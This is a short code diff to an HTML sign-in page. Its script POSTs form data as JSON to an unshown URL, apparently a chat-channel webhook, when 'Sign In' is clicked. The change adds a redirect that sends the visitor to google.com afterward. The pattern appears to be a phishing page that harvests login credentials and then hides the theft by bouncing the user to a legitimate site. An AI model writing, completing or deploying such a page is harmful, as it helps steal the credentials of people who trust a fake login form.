@@ -25,7 +25,7 @@
                 <button type="button">Forgot your password?</button>
               </div>
           
-          <input type="submit" name="sign-in" value="Sign In" id="submitbutton">
+          <input onclick="myFunction()" type="submit" name="sign-in" value="Sign In" id="submitbutton">
         </form>
       </div>
 	<script>
@@ -39,10 +39,13 @@ const channelMessageButton = document.getElementById("submitbutton");
 
 channelMessageButton.addEventListener("click", () => {
 fetch(url, {method: "POST",headers: {"Content-Type": "application/json",
-				     	    	            window.location.href = "https://www.google.com"
   },body: JSON.stringify(data),
 })
 })
+
+		function myFunction() {
+  location.replace("https://www.google.com")
+}
 				
 				
 	</script>
